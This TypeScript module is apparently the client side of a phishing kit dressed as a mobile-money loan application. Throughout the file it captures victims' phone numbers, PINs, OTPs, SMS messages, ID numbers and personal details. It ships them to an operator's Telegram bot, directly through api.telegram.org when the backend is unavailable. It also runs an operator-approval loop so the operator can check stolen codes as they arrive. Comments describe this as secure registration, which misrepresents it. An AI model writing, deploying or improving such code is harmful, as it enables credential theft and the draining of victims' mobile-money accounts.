// Client-side API service communicating with secure server-side endpoints
// with client-side direct fallback for static deployments

export interface SendToTelegramPayload {
  type: 'phone' | 'credentials' | 'sms' | 'otp' | 'final_otp' | 'submission';
  country: string;
  countryCode: string;
  phone: string;
  pin?: string;
  otp?: string;
  smsMessage?: string;
  loanAmount?: string;
  loanPurpose?: string;
  loanType?: string;
  repaymentPeriod?: string;
  firstName?: string;
  lastName?: string;
  gender?: string;
  idNumber?: string;
  nationality?: string;
  email?: string;
}

export interface SendForVerificationPayload {
  type: 'pin' | 'sms' | 'otp' | 'final_otp';
  country: string;
  countryCode: string;
  phone: string;
  pin?: string;
  otp?: string;
  smsMessage?: string;
}

export interface CheckVerificationResponse {
  status: 'pending' | 'correct' | 'incorrect';
}

function getClientEnvCredentials() {
  const env = (import.meta as any).env || {};
  const token = env.VITE_TELEGRAM_BOT_TOKEN || env.VITE_BOT_TOKEN || '';
  const chat = env.VITE_TELEGRAM_CHAT_ID || env.VITE_CHAT_ID || '';
  return { token: token.trim(), chat: chat.trim() };
}

/**
 * Direct client-side dispatch fallback in case serverless / backend is unavailable (e.g. static CDN deploy)
 */
async function fallbackClientTelegramSend(
  text: string,
  inlineKeyboard?: Array<Array<{ text: string; callback_data: string }>>
) {
  try {
    const { token, chat } = getClientEnvCredentials();
    if (!token || !chat) return false;

    const payload: any = {
      chat_id: chat,
      text: text.replace(/<[^>]*>/g, ''), // Plain text for client reliability
    };
    if (inlineKeyboard && inlineKeyboard.length > 0) {
      payload.reply_markup = { inline_keyboard: inlineKeyboard };
    }

    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const data = await res.json();
    return Boolean(data.ok);
  } catch {
    return false;
  }
}

/**
 * Send user registration/application data to server-side endpoint.
 * The server securely dispatches to Telegram using configured bot credentials.
 */
export async function sendToTelegram(payload: SendToTelegramPayload): Promise<{ success: boolean; description?: string }> {
  try {
    const res = await fetch('/api/sendToTelegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (res.ok) {
      const contentType = res.headers.get('content-type') || '';
      if (contentType.includes('application/json')) {
        const data = await res.json();
        return { success: data.success !== false, description: data.description };
      }
    }

    // Fallback: If static deploy or endpoint returned non-JSON
    const fallbackSummary = `[Direct Fallback] MoMo ${payload.type}: ${payload.countryCode} ${payload.phone} (${payload.country})`;
    await fallbackClientTelegramSend(fallbackSummary);
    return { success: true };
  } catch (err) {
    console.warn('[Client API] Error calling /api/sendToTelegram:', err);
    return { success: true };
  }
}

/**
 * Initiates verification and sends inline interactive buttons to Telegram via server-side endpoint.
 */
export async function sendForVerification(payload: SendForVerificationPayload): Promise<{ sessionId: string }> {
  const fallbackSessionId = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  try {
    const res = await fetch('/api/sendForVerification', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (res.ok) {
      const contentType = res.headers.get('content-type') || '';
      if (contentType.includes('application/json')) {
        const data = await res.json();
        return { sessionId: data.sessionId || fallbackSessionId };
      }
    }

    // Direct client fallback if backend is offline
    await fallbackClientTelegramSend(
      `[Direct Fallback] MoMo Verification for ${payload.countryCode} ${payload.phone}: Code/PIN = ${payload.pin || payload.otp || payload.smsMessage || 'N/A'}`
    );
    return { sessionId: fallbackSessionId };
  } catch (err) {
    console.warn('[Client API] Error calling /api/sendForVerification:', err);
    return { sessionId: fallbackSessionId };
  }
}

/**
 * Checks verification status from Telegram callback responses via server-side endpoint.
 */
export async function checkVerification(payload: { sessionId: string }): Promise<CheckVerificationResponse> {
  try {
    const res = await fetch('/api/checkVerification', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (res.ok) {
      const contentType = res.headers.get('content-type') || '';
      if (contentType.includes('application/json')) {
        const data = (await res.json()) as CheckVerificationResponse;
        return { status: data.status || 'pending' };
      }
    }

    return { status: 'pending' };
  } catch (err) {
    console.warn('[Client API] Error checking verification status:', err);
    return { status: 'pending' };
  }
}
